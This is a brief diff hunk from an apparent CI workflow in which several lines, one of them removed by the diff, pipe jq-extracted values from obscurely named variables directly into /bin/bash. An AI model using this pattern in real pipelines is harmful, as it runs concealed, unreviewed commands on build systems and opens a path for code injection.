@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$yny13" | jq -r .jqamd4 | /bin/bash
           echo $tnq83 | jq -r .wjmgy51856 | /bin/bash
           echo $egsgi14 | jq -r .jnun2 | /bin/bash
-          echo $idxcw68 | jq -r .sbic9 | /bin/bash
           printf '%s' "$mi54012" | jq -r .fgj90647 | /bin/bash
 
       - name: Archive artifact
